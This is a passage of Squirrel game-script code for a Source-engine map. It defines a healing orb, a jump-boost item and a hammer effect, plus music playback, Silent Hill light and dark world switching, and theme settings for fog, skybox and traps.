						::Sound("*luffaren/clang.mp3",button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-40),null,10000,0.05,RandomInt(150,170),10);
						::Particle("blood_spurt_synth_01",button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-40),Vector(),null,0.10);
						::Particle("blood_impact_synth_01_droplets",button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-40),Vector(),null,0.10);
						::Particle("blood_impact_green_02_chunk",button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-40),Vector(),null,0.10);
						::Particle("explosion_huge_c",button.GetOrigin()+(button.GetForwardVector()*96)+Vector(0,0,-40),Vector(),null,0.10);
						local hits = [];
						if(killed_item>0)hits.push(killed_item.tostring()+"x_item");
						if(killed_peanutbutter>0)hits.push(killed_peanutbutter.tostring()+"x_peanut");
						if(killed_claymore>0)hits.push(killed_claymore.tostring()+"x_claymore");
						if(killed_earthcrystal>0)hits.push(killed_earthcrystal.tostring()+"x_earth");
						if(killed_billnye>0)hits.push(killed_billnye.tostring()+"x_billye");
						if(killed_stormblade>0)hits.push(killed_stormblade.tostring()+"x_stormblade");
						local msg = "DestructoHammer destructed ";
						if(hits.len()>0)
						{
							msg = msg+hits[0];
							hits.remove(0);
							foreach(hmsg in hits){msg = msg+" + "+hmsg;}
							printl(msg);
							::ServerSay("say "+msg,0.00,null);
						}
						else printl("DestructoHammer destructed no items");
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","modelscale 0.90",0.00,null,null);
					}
				}},hammerid);
		}
	},
	heal_orb = {
			team = 3,
			hammerid = 3,	//example: 1 (range 1-999)
			follow_user = true,			//set to 'true' to make the orb parent to the user, 'false' will make the spawned orb stationary
			heal_amount = 9,
			heal_amount_max = 150,
			heal_rate = 0.50,
			heal_time = 15.00,
			modelscale_growspeed = 0.04,
			modelscale_target = 2.30,	//gotta match this with 'heal_radius'		(just trial-and-error)
			heal_radius = 200,			//gotta match this with 'modelscale_target'	(just trial-and-error)
			nade_refill = true,			//set to 'true' to give +1 hegrenade to each player inside the heal (only once per heal-orb)
			ammo_refill = true,			//set to 'true' to refill the ammo for each player inside the heal (every 'heal_rate'^)
			nade_equip = null,
			default_ammo = 20,
			specific_ammo = {
				weapon_ak47 = 30,
				weapon_m4a1 = 30,
				weapon_awp = 10,
				weapon_deagle = 7,
				weapon_usp = 12,
				weapon_glock = 20,
				weapon_p228 = 13,
				weapon_elite = 30,
				weapon_fiveseven = 20,
				weapon_m3 = 8,
				weapon_xm1014 = 7,
				weapon_mp5navy = 30,
				weapon_tmp = 30,
				weapon_p90 = 50,
				weapon_mac10 = 30,
				weapon_ump45 = 25,
				weapon_famas = 25,
				weapon_galil = 35,
				weapon_sg552 = 30,
				weapon_aug = 30,
				weapon_scout = 10,
				weapon_g3sg1 = 20,
				weapon_sg550 = 30,
				weapon_m249 = 100,
			},
				//OLD below, just do a table instead^
			//specific_ammo = [
			//		//"weapon_bizon",		64,
			//		//"weapon_negev",		150,
			//		"weapon_m249",		100,
			//		"weapon_p90",		50,
			//	],
			
			disallowed = [
					"weapon_knife",
					"weapon_incgrenade",
					"weapon_molotov",
					"weapon_bumpmine",
				],
		function Spawn(pos){
			::CreateItem(pos,Vector(),1,"HealOrb","(1x)\nPlaces out a healing orb\nIt heals "+
				heal_amount.tostring()+"hp every "+heal_rate.tostring()+"s\n(up to "+heal_amount_max.tostring()+"hp)\n"+
				"The orb lasts for "+heal_time.tostring()+"s"+
				"\nThe orb provides infinite ammo\nThe orb provides +1 nade (once)",{
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,2);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/heal_orb.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-30)-(button.GetForwardVector()*6),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/heal_orb.mdl",
								modelscale = 0.30,
								rendermode = 3,
								disableshadows = true,
							},{
							button = button,
							function Run(){
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==3){}//drop
					else if(event==5)//use
					{
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = null;
						if(!::ITEMS.heal_orb.follow_user)EntFireByHandle(button,"Kill","",0.05,null,null);
						//button.PrecacheModel("models/luffaren/heal_orb.mdl");
						::Ent(button.GetOrigin(),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/heal_orb.mdl",
								modelscale = 0.50,
								rendermode = 3,
								renderamt = 100,
								glowenabled = 1,
								glowdist = 10000,
								glowstyle = 1,
								glowcolor = Vector(100,200,255),
							},{
							master = button,
							scale = 0.50,
							gottakill = false,
							gottashrink = false,
							naders = [],
							function Tick(){
								if(!gottashrink)
								{
									if(scale>=::ITEMS.heal_orb.modelscale_target)
									{
										scale = 0.00+::ITEMS.heal_orb.modelscale_target;
										::NetProps.SetPropFloat(self,"m_flModelScale",scale);
										EntFireByHandle(self,"RunScriptCode"," HealTick(); ",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode"," gottakill = true; ",::ITEMS.heal_orb.heal_time,null,null);
										return;
									}
								}
								else
								{
									if(scale<=0.00)
									{
										EntFireByHandle(self,"Kill","",0.00,null,null);
										if(::ITEMS.heal_orb.follow_user)EntFireByHandle(master,"Kill","",0.00,null,null);
										return;
									}
								}
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.01,null,null);
								if(!gottashrink)scale += ::ITEMS.heal_orb.modelscale_growspeed;
								else scale -= (::ITEMS.heal_orb.modelscale_growspeed*2);
								::NetProps.SetPropFloat(self,"m_flModelScale",scale);
							},function HealTick(){
								if(gottakill)
								{
									gottashrink = true;
									Tick();
									return;
								}
								EntFireByHandle(self,"RunScriptCode"," HealTick(); ",::ITEMS.heal_orb.heal_rate,null,null);
								for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin(),::ITEMS.heal_orb.heal_radius);)
								{
									if(h.IsAlive()==false||h.GetTeam()!=3)continue;
									local newhp = h.GetHealth()+::ITEMS.heal_orb.heal_amount;
									if(newhp > ::ITEMS.heal_orb.heal_amount_max)newhp = (0+::ITEMS.heal_orb.heal_amount_max);
									if(h.GetHealth()<newhp)EntFireByHandle(h,"AddOutput","health "+newhp.tostring(),0.00,null,null);
									if(!::ITEMS.heal_orb.nade_refill && !::ITEMS.heal_orb.ammo_refill)continue;
									h.SetMaxHealth(::ITEMS.heal_orb.heal_amount_max);
									
									
									if(::ITEMS.heal_orb.ammo_refill)		//__CSS__ ammo_refill new
									{
										local held_weapon = ::NetProps.GetPropEntity(h,"m_hActiveWeapon");
										if(held_weapon==null||held_weapon.GetClassname()=="weapon_hegrenade"||held_weapon.GetClassname()=="weapon_knife"){}
										else
										{
											
											local ammoset = (0+::ITEMS.heal_orb.default_ammo);
											
											if(held_weapon.GetClassname() in ::ITEMS.heal_orb.specific_ammo)
												ammoset = ::ITEMS.heal_orb.specific_ammo[held_weapon.GetClassname()];
											
											//__CSS__ css3 fix above^  - old below
											
											//for(local i=0;i<::ITEMS.heal_orb.specific_ammo.len();i+=2)
											//{
											//	if(held_weapon.GetClassname()==::ITEMS.heal_orb.specific_ammo[i])
											//	{
											//		ammoset = (0+::ITEMS.heal_orb.specific_ammo[i+1]);
											//		break;
											//	}
											//}
											
											held_weapon.SetClip1(ammoset);
										}
									}
									
									
									local hasnade = false;
									for(local hh=h.FirstMoveChild();hh=hh.NextMovePeer();)
									{
										if(hh.GetClassname().find("weapon_")!=0)continue;
										if(hh.GetClassname()=="weapon_hegrenade"){hasnade=true;continue;}
										
										//__CSS__ ammo_refill old
										//if(!::ITEMS.heal_orb.ammo_refill)continue;
										//local dis=false;foreach(d in ::ITEMS.heal_orb.disallowed){if(hh.GetClassname()==d){dis=true;break;}}if(dis)continue;
										//local ammoset = (0+::ITEMS.heal_orb.default_ammo);
										//for(local i=0;i<::ITEMS.heal_orb.specific_ammo.len();i+=2)
										//{
										//	if(hh.GetClassname()==::ITEMS.heal_orb.specific_ammo[i])
										//	{
										//		ammoset = (0+::ITEMS.heal_orb.specific_ammo[i+1]);
										//		break;
										//	}
										//}
										//EntFireByHandle(hh,"SetAmmoAmount",ammoset.tostring(),0.00,null,null);
									}
									if(!hasnade)
									{
										local naded=false;foreach(nader in naders){if(nader==h){naded=true;break;}}
										if(!naded)
										{
											naders.push(h);
											if(::ITEMS.heal_orb.nade_equip==null||!::ITEMS.heal_orb.nade_equip.IsValid())
											{
												if(::round_ended)return;
												::ITEMS.heal_orb.nade_equip = Entities.CreateByClassname("game_player_equip");
												::ITEMS.heal_orb.nade_equip.__KeyValueFromInt("spawnflags",1);
												::ITEMS.heal_orb.nade_equip.__KeyValueFromString("weapon_hegrenade","1");
											}
											EntFireByHandle(::ITEMS.heal_orb.nade_equip,"Use","",0.00,h,null);
										}
									}
								}
							},function Run(){
								if(::ITEMS.heal_orb.follow_user)
									self.AcceptInput("SetParent","!activator",master,null);
									self.SetLocalOrigin(Vector());
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.00,null,null);
								::Sound("*luffaren/heal_orb.mp3",self.GetOrigin(),null,20000,5.00,95,10);
								::Sound("*luffaren/heal_orb.mp3",self.GetOrigin(),null,20000,5.00,100,10);
								::Sound("*luffaren/heal_orb.mp3",self.GetOrigin(),null,20000,5.00,105,10);
							}});
						::PlayerNameMessage(user,""," used heal orb",0.00);
						return true;
					}
				}},hammerid);
		}
	},
	moonboost = {
			team = 3,
			hammerid = 2,	//example: 1 (range 1-999)
			jump_velocity = 500,
			cooldown = 1.00,
		function Spawn(pos,teamtype=1){
			::CreateItem(pos,Vector(),teamtype,"MoonBoost","("+cooldown+"s)\nGives an upwards boost\nCombine it with jumping for extra height",{
				jump_velocity = jump_velocity,
				cooldown = cooldown,
				model=null,
				teamtype = teamtype,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/props_combine/combinebutton.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-35)-(button.GetForwardVector()*5)+(button.GetRightVector()*2),
							button.GetAngles()+Vector(-90,0,0),"prop_dynamic",{
								model="models/props_combine/combinebutton.mdl",
								rendermode = 1,
								modelscale = 0.60,
							},{
							button = button,
							logic = this,
							teamtype = teamtype,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								if(teamtype == 3)
								{
									EntFireByHandle(self,"AddOutput","glowenabled 1",0.00,null,null);
									EntFireByHandle(self,"AddOutput","glowdist 5000",0.00,null,null);
									EntFireByHandle(self,"AddOutput","glowstyle 1",0.00,null,null);
									EntFireByHandle(self,"AddOutput","glowcolor 255 25 50",0.00,null,null);
								}
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					else if(event==4)//use_failed
						::Sound("*luffaren/jumper_item.mp3",Vector(),button,500,0.05,255,1);
					else if(event==5)//use
					{
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = 0.00+cooldown;
						user.SetVelocity(user.GetVelocity()+Vector(0,0,jump_velocity));
						user.ValidateScriptScope();
						user.GetScriptScope().moonboosting <- true;
						EntFireByHandle(user,"RunScriptCode","try{delete moonboosting;}catch(e){}",0.10,null,null);
						::Sound("*luffaren/jumper_item.mp3",Vector(),button,5000,0.05,200,10);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0",0.00,null,null);
						local rendcol_cd = 0.00+cooldown;
						rendcol_cd -= 0.02;
						if(rendcol_cd<=0.01)rendcol_cd=0.01;
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255",rendcol_cd,null,null);
						::Particle("blood_spurt_synth_01",holder.GetOrigin(),Vector(),null,0.10);
						::Particle("slime_splash_01_droplets",holder.GetOrigin(),Vector(),null,0.10);
						return true;
					}
				}},hammerid);
		}
	},
};
checktri <- dtrange;
theme_changevar <- -1;
theme_changevar_target <- 0;
theme_changevar_fader <- null;
music_allowplay <- true;
music_infinite_chance <- 7.00;		//the chance (0.00-100.00) to pick a song from the infinite/special music pool during infinite mode (else default to current theme)
music_infinite <- [
					{file="#music/luffaren_collective/free_bird.mp3", 				volume=8,		pitch=100,		duration=152.00},
					{file="#music/luffaren_collective/tropic_birds.mp3", 			volume=10,		pitch=100,		duration=168.20},
					{file="#music/luffaren_collective/i_ran.mp3", 					volume=7,		pitch=100,		duration=141.00},
					{file="#music/luffaren_collective/cult_of_personality.mp3", 		volume=8,		pitch=100,		duration=82.00},
					{file="#music/luffaren_collective/heretic_hero.mp3", 			volume=10,		pitch=100,		duration=127.00},
];
//function PlayMusic(){newthread(__PlayMusic.bindenv(this)).call();}	//__CSS__ threading_disabled
function PlayMusic(){__PlayMusic();}
function __PlayMusic()
{
	if(::finale_started)return;
	if(!music_allowplay)return;
	local songarray = ::THEMES[::THEME].music;
	if(::stage != null)
	{
		if(::stage>::STAGES.len())
		{
			theme_changevar++;
			if(theme_changevar > theme_changevar_target)
			{
				theme_changevar = 0;
				theme_changevar_target = RandomInt(::infinite_mode_newthemerand_min,::infinite_mode_newthemerand_max);
				local newthemes = [];
				foreach(i,t in ::THEMES){newthemes.push(i);}
				local lasttheme = ""+::THEME;
				::THEME = newthemes[RandomInt(0,newthemes.len()-1)];
				if(::FORCE_THEME!=null)::THEME = ""+::FORCE_THEME;
				if(lasttheme == ::THEME){}else		//NEW IN V1_7 - don't run the fog/skybox logic for the same theme twice, only do it if a new theme is picked
				{
					songarray = ::THEMES[::THEME].music;
					//EntFire("skybox_master","fadeandkill","5",0.00,null);
					//EntFire("skybox_slave","fadeandkill","5",0.00,null);
					::FadeAndKill("skybox_master",5.00);	//__CSS__ fadeandkill doesn't exist in css
					::FadeAndKill("skybox_slave",5.00);		//__CSS__ fadeandkill doesn't exist in css
					EntFire("manager","RunScriptCode"," ::THEMES[::THEME].SkyboxSetup(); ",0.10,null);
					fog_color_target = ::THEMES[::THEME].fog_color;
					fog_dist_start_target = ::THEMES[::THEME].fog_start;
					fog_dist_end_target = ::THEMES[::THEME].fog_end;
					fog_density_target = ::THEMES[::THEME].fog_density;
					fog_farz_target = ::THEMES[::THEME].fog_farz;
						//resetting silenthill to light world:
							::silenthill_darkworld = false;
							::THEMES.silenthill.music.clear();
							foreach(m in ::THEMES.silenthill.music_light){::THEMES.silenthill.music.push(m);}
							foreach(name,data in ::TILEVARIANTS)
							{
								if(name=="PLATFORM_HIDDEN"||name=="WALL_HIDDEN"||name=="PLATFORM_HIDDEN_BRIDGE"||name=="COLOR")continue;//unsupported models
								foreach(type,data in ::TILEVARIANTS[name].silenthill)
								{
									foreach(k,model in ::TILEVARIANTS[name].silenthill[type])
									{
										if(model.find("dark.mdl")!=null)
										{
											local _model = ""+model;
											local nm = model.slice(0,model.len()-8);
											nm = nm+".mdl";
											::TILEVARIANTS[name].silenthill[type][k] = nm;
										}
									}
								}
							}
					if(::infinite_mode_newtheme_fade)
					{
						if(theme_changevar_fader == null || !theme_changevar_fader.IsValid())
						{
							theme_changevar_fader = Entities.CreateByClassname("env_fade");
							theme_changevar_fader.__KeyValueFromFloat("holdtime",0.10);
							theme_changevar_fader.__KeyValueFromFloat("duration",0.40);
							theme_changevar_fader.__KeyValueFromFloat("ReverseFadeDuration",0.40);
							theme_changevar_fader.__KeyValueFromVector("rendercolor",Vector(255,255,255));
							theme_changevar_fader.__KeyValueFromInt("renderamt",255);
							theme_changevar_fader.__KeyValueFromInt("spawnflags",1);
						}
						EntFireByHandle(theme_changevar_fader,"Fade","",0.00,null,null);
					}
				}
			}
			if(RandomFloat(0.00,100.00)<=music_infinite_chance)
				songarray = music_infinite;
		}
	}
	local song = songarray[RandomInt(0,songarray.len()-1)];
	EntFireByHandle(self,"RunScriptCode"," PlayMusic(); ",song.duration,null,null);
	if("snowstorm_overlay" in song && song.snowstorm_overlay == true)
	{
		EntFire("manager","RunScriptCode","::snowstorm_overlay++;",3.00,null);
		EntFire("manager","RunScriptCode","::snowstorm_overlay--;",song.duration+5.00,null);
	}
	if("silenthill_toggle" in song && song.silenthill_toggle == true)
	{
		::SilentHillWorldSet();
		return;
	}
	local vol = 0.00+song.volume.tofloat();
	vol *= ::music_volume_multiplier;
	if(vol>10)vol=10;
	else if(vol<1)vol=1;
	vol = vol.tointeger();
	PrecacheSound(song.file);
	::Ent(Vector(),Vector(),"ambient_generic",{
			spawnflags = 49,
			volume = (0+vol),
			pitch = (0+song.pitch),
			radius = 100000,
			message = song.file,
			targetname = "music",
		},{
		lifetime = (0.00+song.duration),
		volume = (0+vol),
		pitch = (0+song.pitch),
		function Run(){
			EntFireByHandle(self,"PlaySound","",0.00,null,null);
			EntFireByHandle(self,"Volume",volume.tostring(),0.01,null,null);
			EntFireByHandle(self,"Volume",volume.tostring(),0.03,null,null);
			EntFireByHandle(self,"Pitch",pitch.tostring(),0.02,null,null);
			EntFireByHandle(self,"Kill","",lifetime,null,null);
		}});
}

::SilentHillWorldSet <- function(light_dark=null,instant_nosiren=false)
{
	if(::finale_started || ::finale_checkout_checked || ::finale_checkout)return;
	if(light_dark==null)::silenthill_darkworld = !::silenthill_darkworld;
	else
	{
		if(light_dark && !::silenthill_darkworld)return;
		if(!light_dark && ::silenthill_darkworld)return;
		::silenthill_darkworld = !light_dark;
	}
	if(!instant_nosiren)
	{
		//::EntFire("manager","RunScriptCode","newthread(::__SilentHillWorldSet.bindenv(this)).call();",::silenthill_transdelay,null);	//__CSS__ threading_disabled
		::EntFire("manager","RunScriptCode","::__SilentHillWorldSet();",::silenthill_transdelay,null);
		local shpitch = RandomInt(::silenthill_siren_pitch_min,::silenthill_siren_pitch_max);
		for(local i=0;i<::silenthill_siren_stack;i++){::Sound("*luffaren/silenthill_siren.mp3",Vector(10,0,RandomInt(100,1000)),null,0,20,shpitch,10);}
	}
	//else ::EntFire("manager","RunScriptCode","newthread(::__SilentHillWorldSet.bindenv(this)).call();",0.00,null);	//__CSS__ threading_disabled
	else ::EntFire("manager","RunScriptCode","::__SilentHillWorldSet();",0.00,null);
}
::__SilentHillWorldSet <- function()
{
	if(::finale_started || ::finale_checkout_checked || ::finale_checkout)return;
	local pq = [];
	local pqfog = null;
	::THEMES.silenthill.music.clear();
	if(::silenthill_darkworld)
	{
		pqfog = {function Run(){
			::manager.GetScriptScope().fog_color_target = Vector(0,0,0);
			if(!::ending_called)	//NEW in V1_8 - prevents fog distance from overriding during ending, if timing is bad/unlucky
			{
				::manager.GetScriptScope().fog_dist_start_target = -2500.00;
				::manager.GetScriptScope().fog_dist_end_target = 2500.00;
				::manager.GetScriptScope().fog_density_target = 1.00;
			}
		}};
		foreach(m in ::THEMES.silenthill.music_dark){::THEMES.silenthill.music.push(m);}
		
		//__CSS__ skybox clouds tinting (0 0 0 255 / 100 100 100 255) - DARK
		for(local smaster;smaster=Entities.FindByName(smaster,"skybox_master");)
		{
			local pqsb = [];
			for(local c=100;c>0;c-=2){pqsb.push({smaster=smaster,c=c,function Run(){
				if(this.smaster==null||!this.smaster.IsValid())return;
				EntFireByHandle(this.smaster,"Color",this.c.tostring()+" "+this.c.tostring()+" "+this.c.tostring(),0.00,null,null);
			}});}
			pqsb.push({smaster=smaster,function Run(){
				if(this.smaster==null||!this.smaster.IsValid())return;
				EntFireByHandle(this.smaster,"Color","0 0 0",0.00,null,null);
			}});
			::Process(pqsb,0.10);
		}
	}
	else
	{
		pqfog = {function Run(){
			::manager.GetScriptScope().fog_color_target = Vector(100,100,100);
			if(!::ending_called)	//NEW in V1_8 - prevents fog distance from overriding during ending, if timing is bad/unlucky
			{
				::manager.GetScriptScope().fog_dist_start_target = -1000.00;
				::manager.GetScriptScope().fog_dist_end_target = 5000.00;
				::manager.GetScriptScope().fog_density_target = 1.00;
			}
		}};
		foreach(m in ::THEMES.silenthill.music_light){::THEMES.silenthill.music.push(m);}
		
		//__CSS__ skybox clouds tinting (0 0 0 255 / 100 100 100 255) - LIGHT
		for(local smaster;smaster=Entities.FindByName(smaster,"skybox_master");)
		{
			local pqsb = [];
			for(local c=0;c<100;c+=2){pqsb.push({smaster=smaster,c=c,function Run(){
				if(this.smaster==null||!this.smaster.IsValid())return;
				EntFireByHandle(this.smaster,"Color",this.c.tostring()+" "+this.c.tostring()+" "+this.c.tostring(),0.00,null,null);
			}});}
			pqsb.push({smaster=smaster,function Run(){
				if(this.smaster==null||!this.smaster.IsValid())return;
				EntFireByHandle(this.smaster,"Color","100 100 100",0.00,null,null);
			}});
			::Process(pqsb,0.10);
		}
	}
	local qri = 0;
	local shmodels = [];
	foreach(name,data in ::TILEVARIANTS)
	{
		if(name=="PLATFORM_HIDDEN"||name=="WALL_HIDDEN"||name=="PLATFORM_HIDDEN_BRIDGE"||name=="COLOR")continue;//unsupported models
		foreach(type,data in ::TILEVARIANTS[name].silenthill)
		{
			foreach(k,model in ::TILEVARIANTS[name].silenthill[type])
			{
				if(::silenthill_darkworld && model.find("dark.mdl")==null)
				{
					local _model = ""+model;
					local nm = model.slice(0,model.len()-4);
					nm = nm+"dark.mdl";
					::TILEVARIANTS[name].silenthill[type][k] = nm;
					local exists=false;foreach(m in shmodels){if(m==_model){exists=true;break;}}if(exists)continue;shmodels.push(""+_model);
					qri++;local qr=0.01;if(qri<::silenthill_darkworld_tickbuffer)qr=0.00;else qri=0;
					for(local h;h=Entities.FindByModel(h,_model);){pq.insert(RandomInt(0,pq.len()-1),
					{h=h,nm=nm,qrate=(0.00+qr),		//__CSS__thisified
					function Run(){if(this.h==null||!this.h.IsValid()||!::silenthill_darkworld)return;
						this.h.ValidateScriptScope();if("isshallowjump" in this.h.GetScriptScope())return;this.h.GetScriptScope().silenthill_nm<-""+this.nm;
						if("is_buttonmodel" in this.h.GetScriptScope())
							//EntFireByHandle(this.h,"RunScriptCode","::manager.PrecacheModel(silenthill_nm);self.SetModel(silenthill_nm);",1.00,null,null);
							EntFireByHandle(this.h,"RunScriptCode","self.SetModel(silenthill_nm);",1.00,null,null);
						else
						{
							local ii=0.00;
							for(local c=255;c>0;c-=::silenthill_tfade_amt)
							{
								if(c<0)c=0;
								local r=(75+c);if(r>255)r=255;
								EntFireByHandle(this.h,"AddOutput","rendercolor "+r.tostring()+" "+c.tostring()+" "+c.tostring(),ii,null,null);
								ii+=::silenthill_tfade_rate;
							}
							//EntFireByHandle(this.h,"RunScriptCode","::manager.PrecacheModel(silenthill_nm);self.SetModel(silenthill_nm);",ii,null,null);
							EntFireByHandle(this.h,"RunScriptCode","self.SetModel(silenthill_nm);",ii,null,null);
							ii+=::silenthill_tfade_rate;
							for(local c=0;c<255;c+=::silenthill_tfade_amt)
							{
								if(c>255)c=255;
								local r=(75+c);if(r>255)r=255;
								EntFireByHandle(this.h,"AddOutput","rendercolor "+r.tostring()+" "+c.tostring()+" "+c.tostring(),ii,null,null);
								ii+=::silenthill_tfade_rate;
							}
							EntFireByHandle(this.h,"AddOutput","rendercolor 255 255 255",ii,null,null);
						}
					}});}
				}
				else if(!::silenthill_darkworld && model.find("dark.mdl")!=null)
				{
					local _model = ""+model;
					local nm = model.slice(0,model.len()-8);
					nm = nm+".mdl";
					::TILEVARIANTS[name].silenthill[type][k] = nm;
					local exists=false;foreach(m in shmodels){if(m==_model){exists=true;break;}}if(exists)continue;shmodels.push(""+_model);
					qri++;local qr=0.01;if(qri<::silenthill_darkworld_tickbuffer)qr=0.00;else qri=0;
					for(local h;h=Entities.FindByModel(h,_model);){pq.insert(RandomInt(0,pq.len()-1),
					{h=h,nm=nm,qrate=(0.00+qr),		//__CSS__thisified
					function Run(){if(this.h==null||!this.h.IsValid()||::silenthill_darkworld)return;
						this.h.ValidateScriptScope();if("isshallowjump" in this.h.GetScriptScope())return;this.h.GetScriptScope().silenthill_nm<-""+this.nm;
						if("is_buttonmodel" in this.h.GetScriptScope())
							//EntFireByHandle(this.h,"RunScriptCode","::manager.PrecacheModel(silenthill_nm);self.SetModel(silenthill_nm);",1.00,null,null);
							EntFireByHandle(this.h,"RunScriptCode","self.SetModel(silenthill_nm);",1.00,null,null);
						else
						{
							local ii=0.00;
							for(local c=255;c>0;c-=::silenthill_tfade_amt)
							{
								if(c<0)c=0;
								local r=(75+c);if(r>255)r=255;
								EntFireByHandle(this.h,"AddOutput","rendercolor "+r.tostring()+" "+r.tostring()+" "+c.tostring(),ii,null,null);
								ii+=::silenthill_tfade_rate;
							}
							//EntFireByHandle(this.h,"RunScriptCode","::manager.PrecacheModel(silenthill_nm);self.SetModel(silenthill_nm);",ii,null,null);
							EntFireByHandle(this.h,"RunScriptCode","self.SetModel(silenthill_nm);",ii,null,null);
							EntFireByHandle(this.h,"AddOutput","rendercolor 0 0 0",ii+0.01,null,null);
							ii+=::silenthill_tfade_rate;
							for(local c=0;c<255;c+=::silenthill_tfade_amt)
							{
								if(c>255)c=255;
								local r=(75+c);if(r>255)r=255;
								EntFireByHandle(this.h,"AddOutput","rendercolor "+r.tostring()+" "+r.tostring()+" "+c.tostring(),ii,null,null);
								ii+=::silenthill_tfade_rate;
							}
							EntFireByHandle(this.h,"AddOutput","rendercolor 255 255 255",ii,null,null);
						}
					}});}
				}
			}
		}
	}
	pq.insert(0,pqfog);
	::Process(pq,0.01);
}

if(!("THEMES_BASE" in this))
::THEMES_BASE <- {
	generic = {
		airaccelerate					=		12,
		generichold_opentime			=		5.00,
		hold_opentime					=		0.00,
		endbutton_time					=		0.00,
		endtile_time					=		0.00,
		precipitations					=		[0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,3,4],		//0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
		elevator_timings				=		Vector(1.50, 1.50, 5.00),					//(toggletime_MIN, toggletime_MAX, starttime_MAX *MIN@0.05*)
		elevator_speed_min				=		100,
		elevator_speed_max				=		200,
		hold_openspeed_min				=		100,
		hold_openspeed_max				=		100,
		wallheightrand_min				=		0.00,
		wallheightrand_max				=		6.00,
		breakable_health				= 		0.5,
		lowgrav_skin					=		1,
		airslide_skin					=		1,
		airslide_samerot				=		false,
		liquid_skin						=		1,
		hazliquid_skin					=		3,
		liquid_stream_pushamount		= 		200,
		hazliquid_stream_pushamount		= 		200,
		hazliquid_damage				= 		9,
		trapfloor_chance				= 		30.00,
		trapstep_chance					= 		30.00,
		trapvicinity_chance				= 		30.00,
		trapspawn_chance				= 		30.00,
		function HazliquidHurtLogic(player)
		{
			EntFireByHandle(player,"IgniteLifeTime","1",0.00,null,null);
		},
		traps_step = null,				//null:global list
		traps_vicinity = null,			//null:global list
		traps_spawn = null,				//null:global list
		items_h = null,					//null:global list
		items_z = null,					//null:global list
		music = [
							{file="#music/luffaren_collective/realms_of_madmen.mp3", 		volume=6,		pitch=100,		duration=90.00},
							{file="#music/luffaren_collective/liquid_love.mp3", 				volume=6,		pitch=100,		duration=105.00},
							{file="#music/luffaren_collective/heretic.mp3", 					volume=6,		pitch=100,		duration=90.00},
							{file="#music/luffaren_collective/mesh.mp3", 					volume=6,		pitch=100,		duration=100.00},
							{file="#music/luffaren_collective/tcf.mp3", 						volume=4,		pitch=100,		duration=78.00},
		],
		fog_color = Vector(255,255,255),
		fog_start = 500.00,
		fog_end = 15000.00,
		fog_density = 0.00,			//was 0.20 in v1_6 and older, silenthill has gray fog now, so let's keep this unique/separated (it also helps the colors "pop" more without the fog)
		fog_farz = 600000.00,
		function SkyboxSetup()
		{
			EntFire("skyboxswapper","AddOutput","SkyboxName basicsky",0.00,null);
			EntFire("skyboxswapper","Trigger","",0.05,null);
			//::manager.PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
			for(local i=0;i<2;i++)
				::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300)),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
						model="models/luffaren/collective_skybox_clouds.mdl",
						spawnflags = "64",
						modelscale = 15,
						rendermode = 0,		//__CSS__ og was 2
						renderamt = 0,
						rendercolor = "100 100 100",
						targetname = "skybox_master",
					},{function Move(){
						try{self.SetOrigin(Vector(self.GetOrigin().x,self.GetOrigin().y,
						::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos.z+(-(::TELEHURT_Z_OFFSET+300))));}catch(e){}
					},function Run(){
						local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
							EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
					}});
		},
	},
	castle = {
		airaccelerate					=		12,
		generichold_opentime			=		5.00,
		hold_opentime					=		0.00,
		endbutton_time					=		0.00,
		endtile_time					=		0.00,
		precipitations					=		[0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,3,4],		//0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
		elevator_timings				=		Vector(1.50, 1.50, 5.00),					//(toggletime_MIN, toggletime_MAX, starttime_MAX *MIN@0.05*)
		elevator_speed_min				=		100,
		elevator_speed_max				=		200,
		hold_openspeed_min				=		100,
		hold_openspeed_max				=		100,
		wallheightrand_min				=		0.00,
		wallheightrand_max				=		6.00,
		breakable_health				= 		0.5,
		lowgrav_skin					=		2,
		airslide_skin					=		2,
		airslide_samerot				=		false,
		liquid_skin						=		1,
		hazliquid_skin					=		3,
		liquid_stream_pushamount		= 		200,
		hazliquid_stream_pushamount		= 		200,
		hazliquid_damage				= 		9,
		trapfloor_chance				= 		30.00,
